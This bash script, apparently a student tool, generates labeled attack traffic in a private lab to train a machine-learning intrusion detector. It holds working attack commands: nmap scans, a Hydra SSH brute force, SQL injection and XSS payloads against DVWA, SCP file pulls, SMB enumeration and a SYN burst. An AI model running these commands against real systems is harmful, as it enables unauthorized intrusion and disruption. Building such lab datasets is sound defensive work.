#!/bin/bash

# ============================================================
# AI Network Manager - Attack Traffic Generator
# Lab-only attack simulation script
# Author: Bernard Appiah
# Purpose: Generate labeled network traffic for ML IDS training
# ============================================================

# -----------------------------
# 0. SAFETY AND LAB BOUNDARY
# -----------------------------
# Use this script only inside your authorized VCloud lab.
# Do not point TARGET_SUBNET or target IP variables at public IPs.
# The script includes a private-IP check to reduce accidental misuse.

# -----------------------------
# 1. CONFIGURATION
# -----------------------------

TARGET_SUBNET="192.168.10.0/24"
META_IP="192.168.10.20"
UBUNTU_IP="192.168.10.30"
WINDOWS_IP="192.168.10.40"
AI_MANAGER_IP="192.168.10.50"

META_USER="msfadmin"
META_PASS="msfadmin"

UBUNTU_USER="student"
UBUNTU_PASS="student"

WORDLIST="./wordlists/demo-passwords.txt"
LOG_DIR="./logs"
EXFIL_DIR="./exfil"
EXFIL_FILE="./exfil/sample-sensitive-file.txt"
LABEL_LOG="./logs/attack-labels.csv"

mkdir -p "$LOG_DIR" "$EXFIL_DIR" "./wordlists" "./payloads"

# -----------------------------
# 2. HELPER FUNCTIONS
# -----------------------------

timestamp() {
    date +"%Y-%m-%d_%H-%M-%S"
}

now_iso() {
    date -Iseconds
}

banner() {
    echo
    echo "============================================================"
    echo "$1"
    echo "============================================================"
}

pause_between_attacks() {
    echo
    echo "[*] Waiting 10 seconds before the next action for cleaner labels..."
    sleep 10
}

init_files() {
    if [ ! -f "$WORDLIST" ]; then
        cat > "$WORDLIST" << 'EOF'
admin
password
123456
msfadmin
toor
kali
ubuntu
student
network
security
EOF
    fi

    if [ ! -f "$EXFIL_FILE" ]; then
        cat > "$EXFIL_FILE" << 'EOF'
Student Project Simulated Sensitive File
This file is harmless and used only for controlled ML traffic labeling.
Project: AI Network Manager
EOF
    fi

    if [ ! -f "$LABEL_LOG" ]; then
        echo "timestamp,class,activity,target,notes" > "$LABEL_LOG"
    fi
}

log_label() {
    local class="$1"
    local activity="$2"
    local target="$3"
    local notes="$4"
    echo "$(now_iso),$class,$activity,$target,$notes" >> "$LABEL_LOG"
}

is_private_ip() {
    local ip="$1"
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
    return 1
}

safety_check() {
    banner "SAFETY CHECK"
    echo "[*] Checking target IPs..."

    for ip in "$META_IP" "$UBUNTU_IP" "$WINDOWS_IP" "$AI_MANAGER_IP"; do
        if ! is_private_ip "$ip"; then
            echo "[!] Safety check failed: $ip is not a private RFC1918 lab IP."
            echo "[!] Edit the script and use only your isolated VCloud lab IPs."
            exit 1
        fi
    done

    echo "[+] Safety check passed. All configured hosts are private lab IPs."
}

check_tools() {
    banner "TOOL CHECK"
    local missing=0
    for tool in nmap hydra curl dig nslookup ssh sshpass scp smbclient hping3; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo "[!] Missing tool: $tool"
            missing=1
        else
            echo "[+] Found: $tool"
        fi
    done

    if [ "$missing" -eq 1 ]; then
        echo
        echo "Install missing tools with:"
        echo "sudo apt update"
        echo "sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional"
        exit 1
    fi
}

# -----------------------------
# 3. NORMAL TRAFFIC
# -----------------------------

normal_traffic() {
    banner "CLASS: NORMAL TRAFFIC"
    log_label "Normal" "Start normal traffic generation" "Multiple" "DNS HTTP and SSH baseline"

    echo "[*] Running DNS lookups..."
    dig example.com > "$LOG_DIR/normal_dns_dig_$(timestamp).log" 2>&1
    nslookup example.com > "$LOG_DIR/normal_dns_nslookup_$(timestamp).log" 2>&1

    echo "[*] Simulating normal web browsing to lab services..."
    curl -I --max-time 5 "http://$META_IP" > "$LOG_DIR/normal_http_meta_$(timestamp).log" 2>&1
    curl -I --max-time 5 "http://$UBUNTU_IP" > "$LOG_DIR/normal_http_ubuntu_$(timestamp).log" 2>&1

    echo "[*] Simulating a normal SSH login to Metasploitable..."
    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "$META_USER@$META_IP" "whoami; hostname" \
        > "$LOG_DIR/normal_ssh_meta_$(timestamp).log" 2>&1

    log_label "Normal" "Completed normal traffic generation" "Multiple" "Baseline completed"
    echo "[+] Normal traffic completed."
}

# -----------------------------
# 4. RECONNAISSANCE
# -----------------------------

recon_scan() {
    banner "CLASS: RECONNAISSANCE"
    log_label "Recon" "Start ping sweep" "$TARGET_SUBNET" "Nmap host discovery"

    echo "[*] Running ping sweep against lab subnet..."
    nmap -sn "$TARGET_SUBNET" -oN "$LOG_DIR/recon_ping_sweep_$(timestamp).log"

    pause_between_attacks

    log_label "Recon" "Start TCP SYN scan" "$META_IP" "Nmap SYN scan"
    echo "[*] Running TCP SYN scan against Metasploitable..."
    sudo nmap -sS "$META_IP" -oN "$LOG_DIR/recon_syn_scan_meta_$(timestamp).log"

    pause_between_attacks

    log_label "Recon" "Start service version enumeration" "$META_IP" "Nmap service discovery"
    echo "[*] Running service/version enumeration against Metasploitable..."
    nmap -sV "$META_IP" -oN "$LOG_DIR/recon_service_enum_meta_$(timestamp).log"

    log_label "Recon" "Completed reconnaissance" "$META_IP" "Recon completed"
    echo "[+] Reconnaissance traffic completed."
}

# -----------------------------
# 5. BRUTE FORCE
# -----------------------------

ssh_bruteforce() {
    banner "CLASS: BRUTE FORCE"
    log_label "Brute Force" "Start controlled SSH brute force" "$META_IP" "Hydra small wordlist"

    echo "[*] Running controlled SSH brute-force attempt against Metasploitable..."
    echo "[*] This uses a small lab wordlist to create authentication-failure traffic."

    hydra -l "$META_USER" -P "$WORDLIST" "ssh://$META_IP" -t 2 -W 5 \
        -o "$LOG_DIR/bruteforce_ssh_meta_$(timestamp).log"

    log_label "Brute Force" "Completed controlled SSH brute force" "$META_IP" "Hydra completed"
    echo "[+] SSH brute-force simulation completed."
}

# -----------------------------
# 6. WEB ATTACKS
# -----------------------------

web_attack() {
    banner "CLASS: WEB ATTACK"
    log_label "Web Attack" "Start web attack payloads" "$META_IP" "SQLi and XSS test requests"

    echo "[*] Sending a normal web request first..."
    curl --max-time 5 "http://$META_IP/" \
        -o "$LOG_DIR/web_normal_request_$(timestamp).html" 2>/dev/null

    pause_between_attacks

    echo "[*] Sending SQL injection-style test payload to DVWA path if available..."
    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit" \
        -o "$LOG_DIR/web_sqli_payload_$(timestamp).html" 2>/dev/null

    pause_between_attacks

    echo "[*] Sending XSS-style test payload to DVWA path if available..."
    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" \
        -o "$LOG_DIR/web_xss_payload_$(timestamp).html" 2>/dev/null

    log_label "Web Attack" "Completed web payload requests" "$META_IP" "Web attack simulation completed"
    echo "[+] Web attack simulation completed."
}

# -----------------------------
# 7. EXFILTRATION SIMULATION
# -----------------------------

exfiltration_simulation() {
    banner "CLASS: EXFILTRATION"
    log_label "Exfiltration" "Start SCP transfer simulation" "$META_IP" "Harmless sample file transfer"

    echo "[*] Simulating file movement using SCP."
    echo "[*] File: $EXFIL_FILE"
    echo "[*] This is a harmless sample file for ML traffic labeling."

    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no "$EXFIL_FILE" \
        "$META_USER@$META_IP:/tmp/exfil-test-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_upload_meta_$(timestamp).log" 2>&1

    pause_between_attacks

    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no "$META_USER@$META_IP" \
        "echo 'Harmless victim-side sample for exfil simulation' > /tmp/victim-side-sample.txt" \
        > "$LOG_DIR/exfil_prepare_remote_file_$(timestamp).log" 2>&1

    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no \
        "$META_USER@$META_IP:/tmp/victim-side-sample.txt" \
        "./exfil/pulled-from-target-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_pull_meta_$(timestamp).log" 2>&1

    log_label "Exfiltration" "Completed SCP transfer simulation" "$META_IP" "SCP file movement completed"
    echo "[+] Exfiltration simulation completed."
}

# -----------------------------
# 8. LATERAL MOVEMENT SIMULATION
# -----------------------------

lateral_movement() {
    banner "CLASS: LATERAL MOVEMENT"
    log_label "Lateral Movement" "Start SMB enumeration" "$WINDOWS_IP" "SMB share discovery"

    echo "[*] Simulating SMB enumeration against Windows target..."
    smbclient -L "//$WINDOWS_IP/" -N \
        > "$LOG_DIR/lateral_smb_enum_windows_$(timestamp).log" 2>&1

    pause_between_attacks

    log_label "Lateral Movement" "Start SSH internal movement simulation" "$META_IP" "SSH host-to-host style activity"
    echo "[*] Simulating internal SSH movement to Metasploitable..."
    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "$META_USER@$META_IP" "hostname; ip addr | head" \
        > "$LOG_DIR/lateral_ssh_meta_$(timestamp).log" 2>&1

    log_label "Lateral Movement" "Completed lateral movement simulation" "Multiple" "SMB and SSH movement completed"
    echo "[+] Lateral movement simulation completed."
}

# -----------------------------
# 9. CONTROLLED DOS-LIKE TRAFFIC
# -----------------------------

dos_simulation() {
    banner "CLASS: CONTROLLED DOS-LIKE TRAFFIC"
    log_label "DoS" "Start controlled SYN burst" "$META_IP" "Low-count hping3 SYN burst"

    echo "[!] This is a controlled lab-only SYN burst."
    echo "[!] Keep this low-rate. The goal is traffic generation, not disruption."
    echo "[!] Packet count is intentionally limited to 100."

    sudo hping3 -S "$META_IP" -p 80 -c 100 --fast \
        > "$LOG_DIR/dos_syn_burst_meta_$(timestamp).log" 2>&1

    log_label "DoS" "Completed controlled SYN burst" "$META_IP" "100 SYN packets sent"
    echo "[+] Controlled DoS-like traffic completed."
}

# -----------------------------
# 10. RUN ALL
# -----------------------------

run_all() {
    banner "RUNNING FULL ATTACK TRAFFIC DEMO"

    normal_traffic
    pause_between_attacks

    recon_scan
    pause_between_attacks

    ssh_bruteforce
    pause_between_attacks

    web_attack
    pause_between_attacks

    exfiltration_simulation
    pause_between_attacks

    lateral_movement
    pause_between_attacks

    dos_simulation

    banner "FULL DEMO COMPLETED"
    echo "[*] Label log saved to: $LABEL_LOG"
    echo "[*] Tool logs saved in: $LOG_DIR"
}

# -----------------------------
# 11. MAIN MENU
# -----------------------------

init_files
safety_check
check_tools

while true; do
    echo
    echo "AI Network Manager - Attack Traffic Generator"
    echo "------------------------------------------------"
    echo "1. Generate Normal Traffic"
    echo "2. Reconnaissance: Nmap + Ping Sweep"
    echo "3. Brute Force: Hydra SSH"
    echo "4. Web Attack: SQLi + XSS"
    echo "5. Exfiltration: SCP Transfer"
    echo "6. Lateral Movement: SMB + SSH"
    echo "7. Controlled DoS-like SYN Burst"
    echo "8. Run Full Demo"
    echo "9. Exit"
    echo "------------------------------------------------"
    read -p "Select option: " choice

    case $choice in
        1) normal_traffic ;;
        2) recon_scan ;;
        3) ssh_bruteforce ;;
        4) web_attack ;;
        5) exfiltration_simulation ;;
        6) lateral_movement ;;
        7) dos_simulation ;;
        8) run_all ;;
        9) echo "Exiting."; exit 0 ;;
        *) echo "Invalid option." ;;
    esac
done
